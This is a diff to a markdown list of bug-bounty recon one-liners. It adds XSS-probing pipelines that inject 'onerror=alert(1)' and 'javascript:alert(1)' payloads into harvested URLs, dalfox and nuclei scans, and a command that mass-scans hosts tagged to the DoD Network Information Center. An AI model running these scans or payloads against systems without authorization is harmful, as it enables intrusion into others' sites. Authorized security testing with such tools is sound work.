@@ -111,6 +111,23 @@ cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.t
 assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
 ```
 
+## XSS freq
+> @ofjaaah
+```bash
+echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+```
+
+## Find xss
+> @skothastad
+```bash
+cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
+```
+
+>@mamunwhh
+```bash
+cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
+```
+
 ## Dump In-Scope Assests from Bounty Program
 ### BugCrowd Programs
 > @dwisiswant0
@@ -241,10 +258,20 @@ cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | 
 gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
 ```
 
-## Uncover
+# Uncover
 >  [projectdiscovery/uncover](https://github.com/projectdiscovery/uncover)
 ```bash
 uncover -q http.title:"GitLab" -silent | httpx -silent | nuclei
 uncover -q target -f ip | naabu
 echo jira | uncover -e shodan,censys -silent
+```
+> @ofjaah
+```bash
+uncover -q 'org:"DoD Network Information Center"' | httpx -silent | nuclei -silent -severity low,medium,high,critical
+```
+
+# Find admin login
+> @0x_rood
+```bash
+cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
 ```
